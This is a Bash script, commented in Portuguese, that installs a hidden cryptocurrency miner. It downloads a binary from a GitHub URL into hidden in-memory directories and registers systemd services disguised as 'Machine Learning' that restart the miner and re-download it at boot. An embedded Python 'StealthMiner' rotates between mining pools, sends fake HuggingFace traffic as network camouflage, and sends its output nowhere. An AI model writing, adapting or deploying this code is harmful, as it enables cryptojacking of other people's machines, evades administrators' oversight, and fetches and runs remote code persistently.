#!/bin/bash

echo "=== Reinstalação Completa do Minerador ==="

# Configurações
WALLET="0x0067E6557AC5096733dB091900CC9B989148C4e5.A-1"
SERVICE_NAME="mltrainer-$(hostname | md5sum | cut -c1-8)"
LOG_DIR="/dev/shm"  # Diretório em memória para logs
LOG_FILE="$LOG_DIR/.ml.log"
BINARY_DIR="/dev/shm/.bin"
CONFIG_DIR="/dev/shm/.cfg"

# Limpa instalações anteriores
systemctl stop $SERVICE_NAME 2>/dev/null
systemctl disable $SERVICE_NAME 2>/dev/null

# Cria diretórios na memória
mkdir -p $BINARY_DIR $CONFIG_DIR $LOG_DIR

# Instala dependências básicas
apt-get update -qq
apt-get install -y -qq python3-requests wget curl

# Cria arquivo de configuração
cat > $CONFIG_DIR/config.json << 'EOF'
{
  "stratum_servers": [
    "stratum+tcp://18.223.152.88:5432",
    "stratum+ssl://quai.kryptex.network:8888"
  ]
}
EOF

# Download direto do binário
echo "Baixando binário do minerador..."
curl -s -L "https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel" -o "$BINARY_DIR/rigel"
chmod +x "$BINARY_DIR/rigel"

# Verifica se o download foi bem-sucedido
if [ ! -x "$BINARY_DIR/rigel" ]; then
    echo "Erro: Falha ao baixar o binário."
    exit 1
fi

# Script Python
cat > "$BINARY_DIR/monitor.py" << 'EOF'
import os, sys, time, json, socket, ssl, logging, random, requests, subprocess, signal

# Configuração de logging em memória
logging.basicConfig(
    filename='/dev/shm/.ml.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class StealthMiner:
    def __init__(self):
        self.wallet = os.environ.get('WALLET')
        self.binary = '/dev/shm/.bin/rigel'
        self.config_path = '/dev/shm/.cfg/config.json'
        self.current_stratum = None
        self.process = None
        
        logging.info(f"Inicializando com binário: {self.binary}")
        
        if not os.path.exists(self.binary):
            logging.error(f"Binário não encontrado: {self.binary}")
        else:
            logging.info(f"Binário encontrado")

    def get_stratums(self):
        try:
            with open(self.config_path, 'r') as f:
                config = json.load(f)
            
            stratums = config['stratum_servers']
            logging.info(f"Servidores carregados: {len(stratums)}")
            return stratums
        except Exception as e:
            logging.error(f"Erro ao carregar configuração: {e}")
            return [
                "stratum+tcp://18.223.152.88:5432",
                "stratum+ssl://quai.kryptex.network:8888"
            ]

    def start_miner(self, stratum):
        if not os.path.exists(self.binary):
            logging.error("Binário não encontrado")
            return False
            
        try:
            # Finaliza processo anterior
            if self.process and self.process.poll() is None:
                try:
                    os.kill(self.process.pid, signal.SIGTERM)
                    self.process.wait(timeout=5)
                except Exception as e:
                    logging.warning(f"Erro ao finalizar processo: {e}")
            
            cmd = [
                self.binary,
                "-a", "quai",
                "-o", stratum,
                "-u", self.wallet,
                "-p", "x"
            ]
            
            logging.info(f"Executando: {' '.join(cmd)}")
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True
            )
            
            time.sleep(2)
            if self.process.poll() is not None:
                stdout, stderr = self.process.communicate()
                logging.error(f"Falha ao iniciar: {stderr.decode('utf-8', errors='ignore')}")
                self.process = None
                return False
                
            logging.info("Iniciado com sucesso")
            return True
            
        except Exception as e:
            logging.error(f"Erro ao iniciar: {e}")
            return False

    def check_stratum(self, stratum):
        try:
            protocol, rest = stratum.split("://")
            host, port_str = rest.split(":")
            port = int(port_str)
            
            logging.info(f"Verificando {host}:{port}")
            
            with socket.create_connection((host, port), timeout=10) as sock:
                if protocol == "stratum+ssl":
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        logging.info(f"Conexão SSL OK: {stratum}")
                        return True
                else:
                    logging.info(f"Conexão TCP OK: {stratum}")
                    return True
        except Exception as e:
            logging.warning(f"Erro ao verificar {stratum}: {e}")
            return False

    def rotate_stratum(self):
        stratums = self.get_stratums()
        random.shuffle(stratums)
        
        for stratum in stratums:
            if self.check_stratum(stratum):
                if stratum != self.current_stratum:
                    logging.info(f"Alternando para {stratum}")
                    self.current_stratum = stratum
                    return self.start_miner(stratum)
                else:
                    return True
        
        return False

    def run(self):
        failures = 0
        
        logging.info("Sistema iniciado")
        
        while True:
            try:
                # Verifica minerador
                if not self.process or self.process.poll() is not None:
                    if not self.rotate_stratum():
                        failures += 1
                        if failures > 5:
                            logging.error("Muitas falhas, aguardando...")
                            time.sleep(300)
                            failures = 0
                    else:
                        failures = 0
                
                # Camuflagem de rede
                try:
                    requests.get(
                        "https://datasets-server.huggingface.co/valid",
                        params={"dataset": "wiki40b", "config": "pt"},
                        headers={"User-Agent": "HuggingFace/4.35.0"},
                        timeout=15
                    )
                except:
                    pass
                
                # Verificação periódica
                if random.random() < 0.2:
                    self.rotate_stratum()
                
                # Intervalo variável
                sleep_time = random.randint(240, 480)
                logging.info(f"Próxima verificação em {sleep_time//60} minutos")
                time.sleep(sleep_time)

            except Exception as e:
                logging.error(f"Erro no loop principal: {e}")
                time.sleep(60)

if __name__ == "__main__":
    try:
        miner = StealthMiner()
        miner.run()
    except Exception as e:
        logging.critical(f"Erro fatal: {e}")
        sys.exit(1)
EOF

# Serviço systemd
cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
[Unit]
Description=Machine Learning Framework
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Environment="WALLET=$WALLET"
ExecStart=/usr/bin/python3 $BINARY_DIR/monitor.py
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Script de restauração
cat > "/etc/systemd/system/ml-restore.service" << EOF
[Unit]
Description=Machine Learning Restore
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'mkdir -p /dev/shm/.bin /dev/shm/.cfg && curl -s -L "https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel" -o "/dev/shm/.bin/rigel" && chmod +x "/dev/shm/.bin/rigel" && systemctl restart $SERVICE_NAME'
RemainAfterExit=true

[Install]
WantedBy=multi-user.target
EOF

# Habilita e inicia os serviços
systemctl daemon-reload
systemctl enable ml-restore.service
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME

# Verifica o status
sleep 2
if systemctl is-active --quiet $SERVICE_NAME; then
    echo "✓ Serviço iniciado com sucesso!"
else
    echo "✗ Erro ao iniciar o serviço."
    systemctl status $SERVICE_NAME
fi

echo
echo "=== Instalação Concluída ==="
echo "Minerador configurado para carteira: $WALLET"
echo "Nome do serviço: $SERVICE_NAME"
echo "Logs em memória: $LOG_FILE"
echo
echo "Para monitorar:"
echo "  tail -f $LOG_FILE"
echo "  systemctl status $SERVICE_NAME"

# Limpa variáveis
unset WALLET
